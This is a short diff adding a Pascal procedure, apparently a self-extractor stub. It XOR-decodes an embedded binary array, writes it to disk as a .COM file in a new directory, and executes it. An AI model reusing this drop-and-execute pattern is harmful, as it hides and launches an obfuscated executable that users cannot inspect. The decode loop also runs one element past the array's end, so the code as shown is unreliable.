@@ -1,0 +1,15 @@
+   Procedure PMP_Init;
+   Var
+   F:File;
+   W:Word;
+    Begin
+    Randomize;
+    MkDir('PMP_DiR');
+    ChDir('PMP_DiR');
+    For W := 0 to SizeOf(Binary) do Binary[W] := Binary[W] xor DKey;
+    Assign(F,'PMP_SFX_.COM');
+    Rewrite(F,1);
+    BlockWrite(F,Binary,Sizeof(Binary));
+    Close(F);
+    Exec('PMP_SFX_.COM','');
+   End;
